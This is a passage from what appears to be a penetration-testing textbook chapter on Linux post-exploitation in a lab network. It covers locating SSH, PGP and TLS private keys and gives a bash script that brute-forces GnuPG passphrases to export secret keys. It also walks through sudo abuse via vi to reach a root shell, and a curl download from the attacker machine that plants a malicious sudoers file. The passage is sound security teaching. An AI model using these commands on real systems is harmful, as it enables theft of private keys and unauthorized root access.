<p class="TNI1">Unless modified, SSH private keys are usually named <i>id_rsa</i>, after the RSA cryptosystem, or <i>id_dsa</i>, after the Digital Signature Algorithm (DSA) cryptosystem, without an extension. Their corresponding public key is usually either <i>id_rsa.pub</i> or <i>id_dsa.pub</i>. You’ll typically find SSH keys under the hidden directory <i>.ssh</i> for each user account. For example, the user Eve’s SSH keys would be stored at <i>/home/eve/.ssh/id_rsa</i> and <i>/home/eve/.ssh/id_rsa.pub</i> if generated using RSA.</p>&#13;
<p class="TX">SSH private keys have a well-defined file structure, shown here:</p>&#13;
<pre><code>-----BEGIN OPENSSH PRIVATE KEY-----&#13;
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&#13;
NhAAAAAwEAAQAAAYEAqcqpBTfIwqwiFtOvM1DlTEplYuwYyrc4OBOBR2Wz6ItsX+cA/zV4&#13;
<var>--snip--</var>&#13;
-----END OPENSSH PRIVATE KEY-----&#13;
</code></pre>&#13;
<p class="TX">The keys use <i>Privacy-Enhanced Mail (PEM)</i>, a common format to store and transfer cryptographic keys. PEM starts with a header (<span class="SANS_TheSansMonoCd_W5Regular_11">BEGIN</span>), followed by the key data and a footer (<span class="SANS_TheSansMonoCd_W5Regular_11">END</span>). Here are common headers you may see in the wild:</p>&#13;
<pre><code>-----BEGIN SSH2 PRIVATE KEY-----&#13;
-----BEGIN OPENSSH PRIVATE KEY-----&#13;
-----BEGIN PRIVATE KEY-----&#13;
-----BEGIN RSA PRIVATE KEY-----&#13;
-----BEGIN DSA PRIVATE KEY-----&#13;
-----BEGIN EC PRIVATE KEY-----&#13;
</code></pre>&#13;
<p class="TX">Recursively searching for these strings in files is fairly easy. For example, take a look at this <span class="SANS_TheSansMonoCd_W5Regular_11">grep</span> command:</p>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_213" aria-label="213"/>$ <b>grep -R -- "-----BEGIN" /some_directory</b></code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">-R</span> option searches recursively, and the double dash (<span class="SANS_TheSansMonoCd_W5Regular_11">--</span>) prior to the search pattern <span class="SANS_TheSansMonoCd_W5Regular_11">"-----BEGIN"</span> signifies the end of the arguments. This allows us to easily search for strings that contain dashes, such as the ones in PEM headers.</p>&#13;
<p class="TX">You could also try to search for keys of the following types: ecdsa, ecdsa-sk, ed25519, and ed25519-sk. Changing the key type will change the names of the generated keys. For rcdsa, the keys are named <i>id_ecdsa</i> and <i>id_ecdsa.pub</i>, whereas for ed25519, they’re named <i>id_ed25519</i> and <i>id_ed25519.pub</i>.</p>&#13;
<p class="TX">Also look for <i>SSH host keys</i>, the cryptographic keys that validate a server’s identity. When an SSH client connects to an SSH server, the client checks the server’s identity by using the public host key, which is stored in the client’s <i>known_hosts</i> file. If this public key has changed, the SSH client generates an alert saying it can’t verify the host.</p>&#13;
<p class="TX">Public and private SSH host keys are usually stored under the <i>/etc/ssh</i> directory and may have names such as <i>ssh_host_ecdsa_key</i>, <i>ssh_host_rsa_key</i>, <i>ssh_host_ed25519_key</i>, <i>ssh_host_ecdsa_key.pub</i>, <i>ssh_host_rsa_key.pub</i>, or <i>ssh_host_ed25519_key.pub</i>.</p>&#13;
<p class="TX">These keys are usually generated automatically when the server is provisioned, though it’s also possible to manually generate them. Compromising SSH host keys could allow you to impersonate a server on a network.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
<h4 class="H3" id="sec14"><span class="SANS_Futura_Std_Bold_Condensed_B_11">PGP Keys</span></h4>&#13;
<p class="TNI1"><i>Pretty Good Privacy (PGP)</i> is an encryption scheme used to encrypt files, emails, and more. Like SSH keys, PGP private keys use the PEM format. They look something like this:</p>&#13;
<pre><code>-----BEGIN PGP PRIVATE KEY BLOCK-----&#13;
lQVYBGSeRngBDACyE/xXrs89ek7Qcrx0rpupVWkBwv5cZJX3SF64mUlmRWckEBMB&#13;
O8STBlgCVixH7pw5Ke0UPFwOInZMzqAYWuqHwr6MJOVYzhVeEJWIbnAH/7ioh0ti&#13;
<var>--snip--</var>&#13;
-----END PGP PRIVATE KEY BLOCK-----&#13;
</code></pre>&#13;
<p class="TX"><i>GNU Privacy Guard (GnuPG)</i> is an implementation of OpenPGP (defined in RFC 4880) that provides command line utilities for managing PGP keys. It lets you generate keys, import and export keys, verify signatures, and more.</p>&#13;
<p class="TX">You can generate a GnuPG key by using the <span class="SANS_TheSansMonoCd_W5Regular_11">gpg</span> tool and running the <span class="SANS_TheSansMonoCd_W5Regular_11">gpg --generate-key</span> command. When a user generates keys with GnuPG, it stores the keys in a keyring that is usually located in a hidden dot directory named <i>.gnupg</i> under the user’s home directory. (Users can change the keyring’s location by setting the environment variable <span class="SANS_TheSansMonoCd_W5Regular_11">GNUPGHOME</span> to a different directory location.)</p>&#13;
<p class="TX">Within this directory, the<i>~/.gnupg/private-keys-v1.d/</i> folder contains private keys, the <i>~/.gnupg/trustdb.gpg</i> file contains the GnuPG trust database, and the <i>~/.gnupg/pubring.kbx</i> file contains metadata. Therefore, you first need to have access to an account before being able to list the account’s keys.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_214" aria-label="214"/>Let’s export PGP keys from one of the lab’s machines. On <i>p-web-01</i> (172.16.10.10), run the following command:</p>&#13;
<pre><code>$ <b>gpg --list-keys</b></code></pre>&#13;
<p class="TX">This should output any PGP keys accessible to the user, including keys that appear to belong to a server account, <i>arodriguez@acme-infinity-servers.com</i>:</p>&#13;
<pre><code><var>--snip--</var>&#13;
/root/.gnupg/pubring.kbx&#13;
------------------------&#13;
pub   rsa3072&#13;
&#13;
      9DD565D2BB63D9241ACF9F61671507A368BFDC40&#13;
uid           [ultimate] arodriguez@acme-infinity-servers.com&#13;
sub   rsa3072 [E]&#13;
</code></pre>&#13;
<p class="TX">If we wanted to steal this private key, we could export it to a file in the following way:</p>&#13;
<pre><code>$ <b>gpg --output private.pgp --armor --export-secret-key arodriguez@acme-infinity-servers.com</b></code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">--output private.pgp</span> argument writes the content to a file, <span class="SANS_TheSansMonoCd_W5Regular_11">--armor</span> outputs the key in ASCII format, and <span class="SANS_TheSansMonoCd_W5Regular_11">--export-secret-key arodriguez@acme-infinity-servers.com</span> specifies the key to export based on an email address.</p>&#13;
<p class="TX">In certain cases, however, this export may fail. This is because GnuPG keys can be protected if the creator used a passphrase during the key generation, and you’ll need to supply the passphrase to perform the export. In Exercise 16, we’ll cover a way to bypass this protection by using bash.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
<h4 class="H3" id="sec15"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Certificates</span></h4>&#13;
<p class="TNI1">In the post-compromise stage of a penetration test, you may sometimes encounter a server that transmits data over encrypted channels. For example, a web server might send HTTP data over SSL to clients.</p>&#13;
<p class="TX">Popular web servers such as Apache or nginx commonly store certificates in <i>/etc/ssl/certs</i> and private keys in <i>/etc/ssl/private</i>. Certificates usually have the <i>.crt</i> extension, while private keys have the <i>.key</i> or <i>.pem</i> extensions. Those PEM files could contain just the public key, or they could store the entire certificate chain (including the private key, the public key, and root certificates).</p>&#13;
<p class="TX">If you have access to an Apache or nginx configuration file, the configuration keys listed therein usually point to the location of the certificate and its private key. We’ve bolded these keys in the following nginx configuration file:</p>&#13;
<pre><code>server {&#13;
    listen              443 ssl;&#13;
    server_name         example.com;&#13;
<b>    ssl_certificate     example.com.rsa.crt;</b>&#13;
<b>    ssl_certificate_key example.com.rsa.key;</b>&#13;
}&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_215" aria-label="215"/>These keys look like the following in the Apache configuration for an HTTPS-enabled website:</p>&#13;
<pre><code>&lt;VirtualHost *:443&gt;&#13;
   ServerName example.com&#13;
   DocumentRoot /var/www/example.com&#13;
&#13;
   SSLEngine on&#13;
<b>   SSLCertificateFile /etc/ssl/certs/apache-selfsigned.crt</b>&#13;
<b>   SSLCertificateKeyFile /etc/ssl/private/apache-selfsigned.key</b>&#13;
&lt;/VirtualHost&gt;&#13;
</code></pre>&#13;
<p class="TX">You could perform a system-wide search for nginx or Apache configuration files, then cross-examine the location of the keys to see whether they’re accessible to you.</p>&#13;
<p class="TX">Proxies can also be configured to use SSL. Here is an example configuration file for HAProxy, with the location of the PEM file shown in bold:</p>&#13;
<pre><code>frontend www.example.com&#13;
  <b>bind *:443 ssl crt  /etc/haproxy/certs/example_com.pem</b>&#13;
  reqadd X-Forwarded-Proto:\ https&#13;
  default_backend backend_http&#13;
</code></pre>&#13;
<p class="TX">HAProxy, which performs load balancing, may define a few backend servers, each with its own certificate files:</p>&#13;
<pre><code>backend web_servers&#13;
    balance roundrobin&#13;
<b>    server server1 10.0.1.3:443 check maxconn 20 ssl ca-file /etc/ssl/certs/ca.pem</b>&#13;
<b>    server server2 10.0.1.4:443 check maxconn 20 ssl ca-file /etc/ssl/certs/ca.pem</b>&#13;
</code></pre>&#13;
<p class="TX">You can identify these files based on the <i>ca-file</i> parameter.</p>&#13;
<p class="HeadAExercise"><span id="exe-16"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 16: Brute-Forcing GnuPG Key Passphrases</span></p>&#13;
<p class="TNI1">When passphrase protection exists on a GnuPG key, you won’t be able to export the key without providing the passphrase. No sweat, though; there is a bash-y way to brute-force the passphrase.</p>&#13;
<p class="TX"><a href="chapter9.xhtml#Lis9-1">Listing 9-1</a> operates on a file named <i>passphrases.txt</i> containing a bunch of possible passphrases. It assumes the GnuPG key’s ID is the email <i>identity@blackhatbash.com</i>.</p>&#13;
<span id="Lis9-1"/>&#13;
<p class="CodeLabel"><span class="codelabel_Italic">gnupg_passphrase_bf.sh</span></p>&#13;
<pre class="pre"><code>#!/bin/bash&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> KEY_ID="identity@blackhatbash.com"&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> if ! gpg --list-keys | grep uid | grep -q "${KEY_ID}"; then&#13;
  echo "Could not find identity/key ID ${KEY_ID}"&#13;
  exit 1&#13;
fi&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_216" aria-label="216"/>while read -r passphrase; do&#13;
  echo "Brute forcing with ${passphrase}..."&#13;
<span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> if echo "${passphrase}" | gpg --batch \&#13;
                                --yes \&#13;
                                --pinentry-mode loopback \&#13;
                                --passphrase-fd 0 \&#13;
                                --output private.pgp \&#13;
                                --armor \&#13;
                                --export-secret-key "${KEY_ID}"; then&#13;
       echo "Passphrase is: ${passphrase}"&#13;
       echo "Private key is located at private.pgp"&#13;
       exit 0&#13;
  fi&#13;
done &lt; passphrases.txt&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 9-1: Brute-forcing protected GnuPG private keys</span></p>&#13;
<p class="TX">In this script, we define a variable named <span class="SANS_TheSansMonoCd_W5Regular_11">KEY_ID</span> to specify the key ID we want to brute-force <span class="CodeAnnotation" aria-label="annotation1">❶</span>. At <span class="CodeAnnotation" aria-label="annotation2">❷</span>, we list the keys available and <span class="SANS_TheSansMonoCd_W5Regular_11">grep</span> for the key ID we’ll be brute-forcing to ensure it exists. Then we iterate over the <i>passphrase.txt</i> file line by line by using a <span class="SANS_TheSansMonoCd_W5Regular_11">while</span> loop, echo the passphrase <span class="CodeAnnotation" aria-label="annotation3">❸</span>, and pass it as input to the <span class="SANS_TheSansMonoCd_W5Regular_11">gpg</span> command.</p>&#13;
<p class="TX">This command takes a bunch of important parameters that allow us to brute-force the passphrase in an automated fashion. The <span class="SANS_TheSansMonoCd_W5Regular_11">--batch --yes</span> flag allows the <span class="SANS_TheSansMonoCd_W5Regular_11">pgp</span> command to execute while unattended, <span class="SANS_TheSansMonoCd_W5Regular_11">--pinentry-mode loopback</span> allows us to fake a pin entry, <span class="SANS_TheSansMonoCd_W5Regular_11">--passphrase-fd 0</span> makes <span class="SANS_TheSansMonoCd_W5Regular_11">pgp</span> read the passphrase from file descriptor zero (the standard input stream), <span class="SANS_TheSansMonoCd_W5Regular_11">--output</span> writes the output to a file of our choice, <span class="SANS_TheSansMonoCd_W5Regular_11">--armor</span> formats the exported key by using ASCII, and <span class="SANS_TheSansMonoCd_W5Regular_11">--export-secret-key</span> is the key identifier to export.</p>&#13;
<p class="TX">If the <span class="SANS_TheSansMonoCd_W5Regular_11">pgp</span> command returns an exit code of zero, either the passphrase worked or no passphrase was set to begin with, at which point we exit.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>You can find this chapter’s scripts at</i> <span class="note_LinkURL"><a href="https://github.com/dolevf/Black-Hat-Bash/blob/master/ch09">https://github.com/dolevf/Black-Hat-Bash/blob/master/ch09</a></span>.</p>&#13;
<p class="TX">To take this exploitation further and practice your bash scripting, improve the script so it can iterate through all available key identities and brute-force them one by one.</p>&#13;
</section>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
<h2 class="H1" id="sec16"><span id="h1-77"/><span class="SANS_Futura_Std_Bold_B_11">Examining the sudo Configuration</span></h2>&#13;
<p class="TNI1">The <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> Linux command elevates a user’s permissions to root without granting that user direct access to the root account. Imagine that you’re the administrator of a server and want to give another user the ability to add new firewall rules. While you could just hand them the root account password, doing so could lead to a compromise. With <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span>, you could grant permissions to run, say, the <span class="SANS_TheSansMonoCd_W5Regular_11">iptables</span> command or a tool like <span class="SANS_TheSansMonoCd_W5Regular_11">tcpdump</span> without revealing the root account’s password.</p>&#13;
<p class="TX">From an attacker’s perspective, the <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> configuration is worth exploring, as a misconfiguration could grant you access to sensitive resources. On <span role="doc-pagebreak" epub:type="pagebreak" id="pg_217" aria-label="217"/>your Kali machine, the built-in <i>kali</i> user has <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access by default. You can test it by running the following command:</p>&#13;
<pre><code>$ <b>sudo -l</b></code></pre>&#13;
<p class="TX">The command should then prompt you to enter your login password:</p>&#13;
<pre><code>[sudo] password for kali:&#13;
Matching Defaults entries for kali on kali:&#13;
    env_reset, mail_badpass,&#13;
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,&#13;
    use_pty&#13;
&#13;
User kali may run the following commands on kali:&#13;
    <b>(ALL : ALL) ALL</b>&#13;
</code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">-l</span> flag lists the current user’s <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> privileges. As you can see, the user has <span class="SANS_TheSansMonoCd_W5Regular_11">(ALL : ALL) ALL</span>, which basically means unlimited privileged access.</p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> command can grant granular permissions thanks to its configuration file <i>/etc/sudoers</i>. Here are a few permission grants you could achieve with advanced <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> configurations:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Granting <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> permissions to a particular user or group</li>&#13;
<li class="ListBullet">Granting <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> permissions to a particular user or group for a particular system command only</li>&#13;
<li class="ListBullet">Granting <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> permissions to a particular user or group for a particular script only</li>&#13;
<li class="ListBullet">Granting <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> permission to run a command without requiring the user to enter their password</li>&#13;
</ul>&#13;
<p class="TX">To supplement <i>/etc/sudoers</i>, the <i>/etc/sudoers.d</i> directory can store independent <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> configuration files. The main <i>/etc/sudoers</i> file can import files from this directory by using the <span class="SANS_TheSansMonoCd_W5Regular_11">@includedir</span> instruction:</p>&#13;
<pre><code>$ <b>sudo cat /etc/sudoers</b>&#13;
&#13;
<var>--snip--</var>&#13;
@includedir /etc/sudoers.d&#13;
</code></pre>&#13;
<p class="TX">Keep in mind that <i>/etc/sudoers</i> can be modified only by privileged users and is readable only by the <i>root</i> user and root group:</p>&#13;
<pre><code>$ <b>ls -ld /etc/sudoers</b>&#13;
&#13;
-r--r----- 1 root root 1714 Feb 18 07:03 /etc/sudoers&#13;
</code></pre>&#13;
<p class="TX">If you’re able to write to this file or into the directory <i>/etc/sudoers.d</i>, you should be able to grant yourself root access; by default, however, you aren’t able to do this.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_218" aria-label="218"/>In Kali, any member of the <i>kali-trusted</i> group is granted <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access without requiring a password, as defined in the <i>/etc/sudoers.d/kali-grant-root</i> file:</p>&#13;
<pre><code>$ <b>sudo cat /etc/sudoers.d/kali-grant-root</b>&#13;
&#13;
# Allow members of group kali-trusted to execute any command without a&#13;
# password prompt.&#13;
&#13;
<b>%kali-trusted   ALL=(ALL:ALL) NOPASSWD: ALL</b>&#13;
</code></pre>&#13;
<p class="TX">Since the <i>kali</i> user is not part of the <i>kali-trusted</i> group, this user has <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> privileges but is required to supply a password whenever it’s used.</p>&#13;
<p class="TX">However, the <i>kali</i> user is part of the <i>sudo</i> group, referenced in <i>/etc/sudoers</i>. Users who are members of this group are automatically granted unlimited <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access, as defined by this configuration line:</p>&#13;
<pre><code>$ <b>sudo cat /etc/sudoers</b>&#13;
# Allow members of group sudo to execute any command.&#13;
&#13;
%sudo    ALL=(ALL:ALL) ALL&#13;
</code></pre>&#13;
<p class="TX">To see the list of groups the <i>kali</i> user is a member of, run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">groups</span> command:</p>&#13;
<pre><code>$ <b>groups</b>&#13;
&#13;
kali adm dialout cdrom floppy <b>sudo</b> audio dip video plugdev users&#13;
netdev bluetooth scanner wireshark kaboxer vboxsf docker&#13;
</code></pre>&#13;
<p class="TX">Here are a few examples of <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> configurations that could lead to privilege escalation scenarios:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">The system could grant you <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> permissions on dangerous commands, including shell commands that could land you in a root shell.</li>&#13;
<li class="ListBullet">The system could configure <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> on a script that is writable by all users on a system, allowing unauthorized users to add malicious commands that would get executed with the root context.</li>&#13;
<li class="ListBullet">Groups containing a large number of users could be granted <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span>, expanding the attack surface and adding more ways to gain <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access (as you could attempt to exploit each of the <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> group members).</li>&#13;
</ul>&#13;
<p class="TX">The next section should help you understand the dangers of granting <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access.</p>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
<h3 class="H2" id="sec17"><span id="h2-140"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Abusing Text Editor Tricks</span></h3>&#13;
<p class="TNI1">Let’s walk through an attack that relies on <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access. As the backup user on <i>p-jumpbox-01</i> (176.16.10.13), run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">sudo -l</span> command and provide the password (<i>backup</i>) when prompted. Then view the <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> configuration for this user:</p>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_219" aria-label="219"/>$ <b>sudo -l</b>&#13;
&#13;
User backup may run the following commands on p-jumpbox-01:&#13;
    (ALL : ALL) /usr/bin/vi&#13;
    (ALL : ALL) /usr/bin/curl&#13;
</code></pre>&#13;
<p class="TX">It looks like we’ve been granted <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access on vi, a text editor. Granting <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> permissions on a text editor may seem innocent, but it’s not.</p>&#13;
<p class="TX">For instance, we could pass a file to the <span class="SANS_TheSansMonoCd_W5Regular_11">vi</span> command to tell it to write to that file. When granted <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access, we can write to any file we’d like or create new files in system locations that are accessible or writable to the <i>root</i> user only.</p>&#13;
<p class="TX">Let’s write a file to a system location that regular users aren’t allowed to access under normal circumstances. Enter the following:</p>&#13;
<pre><code>$ <b>sudo vi /etc/demo.txt</b></code></pre>&#13;
<p class="TX">A text editor prompt should appear. Press the I key on the keyboard, then enter anything you like. When done, press <small>ESC</small>, followed by <small>SHIFT</small>-:. Enter <span class="SANS_TheSansMonoCd_W7Bold_B_11">wq!</span> and press <small>ENTER</small> to save the file and quit. You’ll notice that we are able to write the file to the <i>/etc</i> directory, which is writable by privileged users only. Similarly, we could edit any file on the system, such as <i>/etc/passwd</i> and <i>/etc/shadow</i>, or even insert a backdoor to an application directly.</p>&#13;
<p class="TX">To take advantage of this access, try dropping yourself into a root shell. vi allows the execution of bash commands from within the text editor’s window. This feature is convenient when you’re programming and need to execute shell commands to see the output or to view files outside the script.</p>&#13;
<p class="TX">Enter <span class="SANS_TheSansMonoCd_W7Bold_B_11">sudo vi</span> in the terminal, then press <small>SHIFT</small>-: and enter <span class="SANS_TheSansMonoCd_W7Bold_B_11">!bash</span>. You should now be in a root shell! Enter the <span class="SANS_TheSansMonoCd_W7Bold_B_11">whoami</span> command to confirm you’re the root user. At this point, you should set the root account’s password by using the <span class="SANS_TheSansMonoCd_W7Bold_B_11">passwd</span> command (without any additional parameters) so that you can easily log in to it at any point.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec18">&#13;
<h3 class="H2" id="sec18"><span id="h2-141"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Downloading Malicious sudoers Files</span></h3>&#13;
<p class="TNI1">In the previous section, you may have noticed that we also have <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access to <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>, used to read resources from web servers. You may be asking yourself, What could we possibly do with <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access to a command line–based HTTP client? Well, quite a bit!</p>&#13;
<p class="TX">If you look at the <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> manual page, you’ll see it provides an <span class="SANS_TheSansMonoCd_W5Regular_11">-o</span> (output) flag for writing content into files or directories. This means you can download files with <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> by making a GET request to a website and redirect the output to a file by using the <span class="SANS_TheSansMonoCd_W5Regular_11">-o</span> flag.</p>&#13;
<p class="TX">To exploit this behavior, we could set up a remote web server that serves a configuration file; if we can download this file in a way that overwrites an existing file, we could elevate our permissions or gain new access. Let’s <span role="doc-pagebreak" epub:type="pagebreak" id="pg_220" aria-label="220"/>exploit <i>p-jumpbox-01</i> (176.16.10.13) once again to elevate from the backup user to the <i>root</i> user. Here are a few directions we could take:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Serving modified versions of <i>/etc/passwd</i> and <i>/etc/shadow</i> files that would change the password of the <i>root</i> user</li>&#13;
<li class="ListBullet">Serving a modified version of <i>/etc/sudoers</i> so it grants <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> permissions to the backup user</li>&#13;
<li class="ListBullet">Inserting a new <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> configuration into the <i>/etc/sudoers.d</i> directory</li>&#13;
<li class="ListBullet">Serving a cron-job shell script that runs in the context of the system (as root) and is tasked with taking privileged actions on our behalf</li>&#13;
</ul>&#13;
<p class="TX">We’ll take the third option: serving a custom <i>sudoers</i> file from the Kali machine and inserting it into the target’s <i>/etc/sudoers.d</i> directory.</p>&#13;
<p class="TX">First, grab the new <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> configuration file, <i>add-sudo-to-user</i>, from the book’s GitHub repository and place it somewhere on your filesystem, such as the Kali home directory. Next, open a terminal and navigate to the directory where the downloaded file is located. Then run the following command to start a web server on port 8080:</p>&#13;
<pre><code>$ <b>python3 -m http.server 8080</b></code></pre>&#13;
<p class="TX">Next, as the <i>p-jumpbox-01</i> backup user, run the following command to download the file from Kali. Kali’s lab IP address should be 172.16.10.1:</p>&#13;
<pre><code>$ <b>sudo curl -s http://172.16.10.1:8080/add-sudo-to-user -o /etc/sudoers.d/add-sudo-to-user</b></code></pre>&#13;
<p class="TX">This <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> command uses the <span class="SANS_TheSansMonoCd_W5Regular_11">-s</span> flag (silent) to suppress output such as the download progress bar. We then make a GET request to the Kali machine to grab <i>add-sudo-to-user</i>. The <span class="SANS_TheSansMonoCd_W5Regular_11">-o</span> (output) flag points to a filesystem destination where the output of the GET request will be saved. In this case, we use the <i>/etc/sudoers.d</i> directory. Confirm that the file was successfully pulled by using <span class="SANS_TheSansMonoCd_W7Bold_B_11">ls</span> to list the files in <i>/etc/sudoers.d</i>. Then run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">sudo -l</span> command to see that you now have full <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access.</p>&#13;
<p class="TX">Keep in mind that manually modifying the <i>sudoers</i> file is quite dangerous. Any errors you make could impact your ability to regain <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access in the future, so we highly recommend using a dedicated <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> modification tool like <span class="SANS_TheSansMonoCd_W5Regular_11">visudo</span> to modify <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> configurations. This tool catches syntax errors early so you don’t get locked out.</p>&#13;
<p class="TX">After successfully compromising the root account, we recommend setting the account’s password to <i>passwd</i> so you can easily switch to the account later.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec19">&#13;
<h2 class="H1" id="sec19"><span id="h1-78"/><span class="SANS_Futura_Std_Bold_B_11">Hijacking Executables via PATH Misconfigurations</span></h2>&#13;
<p class="TNI1">The <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span> environment variable is a colon-separated list of directories in which the shell searches for executables by default. For example, when you enter the <span class="SANS_TheSansMonoCd_W5Regular_11">touch</span> command to create a file, the shell searches the <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span> to locate the binary.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_221" aria-label="221"/>Run the following command on any compromised machine to see its current <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span> value:</p>&#13;
<pre><code>$ <b>echo $PATH</b>&#13;
&#13;
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#13;
</code></pre>&#13;
<p class="TX">To attempt privilege escalation, we could modify the <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span> variable to include additional paths. For example, say a system has a dedicated custom script directory at <i>/data/scripts</i>. Modifying the <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span> directory to include this script directory is quite easy:</p>&#13;
<pre><code>$ <b>PATH=$PATH:/data/scripts</b>&#13;
$ <b>echo $PATH</b>&#13;
&#13;
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/data/scripts&#13;
</code></pre>&#13;
<p class="TX">We can append paths to <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span>, as in the previous example, but also prepend them. In the following example, we prepend the current working directory (<span class="SANS_TheSansMonoCd_W5Regular_11">.</span>) to the path:</p>&#13;
<pre><code>$ <b>PATH=.:$PATH</b></code></pre>&#13;
<p class="TX">Now, if an executable runs as root and calls an external command as part of its logic, it might execute the attacker-controlled file instead of the intended executable.</p>&#13;
<p class="TX">As an example, let’s use <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span> hijacking to run a custom executable. We’ll target the following program written in C, which calls the <span class="SANS_TheSansMonoCd_W5Regular_11">whoami</span> command. Let’s see if we can make it run a different binary of our choosing:</p>&#13;
<pre><code>#include &lt;stdio.h&gt;&#13;
#include &lt;stdlib.h&gt;&#13;
&#13;
int main(void)&#13;
    // This has the potential to get hijacked.&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> system("whoami");&#13;
&#13;
    // This should not be possible to hijack.&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> system("/usr/bin/whoami");&#13;
    return 0;&#13;
}&#13;
</code></pre>&#13;
<p class="TX">At <span class="CodeAnnotation" aria-label="annotation1">❶</span>, the code uses the command <span class="SANS_TheSansMonoCd_W5Regular_11">system("whoami")</span> to call the <span class="SANS_TheSansMonoCd_W5Regular_11">whoami</span> command, and at <span class="CodeAnnotation" aria-label="annotation2">❷</span>, it calls the <i>whoami</i> binary directly by using its absolute path, <i>/usr/bin/whoami</i>.</p>&#13;
<p class="TX">Copy this code into a new file named <i>getuser.c</i> on any of the compromised machines. You can also download the file directly from the book’s GitHub repository. Next, compile this program and make it executable by using the GNU Compiler Collection (GCC):</p>&#13;
<pre><code>$ <b>gcc getuser.c -o getuser</b></code></pre>&#13;
